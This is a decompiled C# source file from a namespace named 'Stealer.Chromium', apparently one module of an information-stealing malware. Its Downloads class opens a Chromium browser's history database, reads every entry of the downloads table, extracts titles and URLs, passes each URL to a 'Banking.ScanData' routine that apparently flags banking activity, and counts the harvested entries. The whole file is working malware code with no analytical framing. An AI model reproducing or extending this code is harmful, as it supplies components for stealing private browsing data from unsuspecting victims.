using System;
using System.Collections.Generic;

namespace Stealer.Chromium
{
	// Token: 0x02000027 RID: 39
	internal sealed class Downloads
	{
		// Token: 0x060000AF RID: 175 RVA: 0x0000772C File Offset: 0x0000592C
		public static List<Site> Get(string sHistory)
		{
			List<Site> list2;
			try
			{
				List<Site> list = new List<Site>();
				SQLite sqlite = SqlReader.ReadTable(sHistory, "downloads");
				bool flag = sqlite == null;
				if (flag)
				{
					list2 = list;
				}
				else
				{
					for (int i = 0; i < sqlite.GetRowCount(); i++)
					{
						Site site = default(Site);
						site.sTitle = Crypto.GetUTF8(sqlite.GetValue(i, 2));
						site.sUrl = Crypto.GetUTF8(sqlite.GetValue(i, 17));
						Banking.ScanData(site.sUrl);
						Counter.Downloads++;
						list.Add(site);
					}
					list2 = list;
				}
			}
			catch
			{
				list2 = new List<Site>();
			}
			return list2;
		}
	}
}
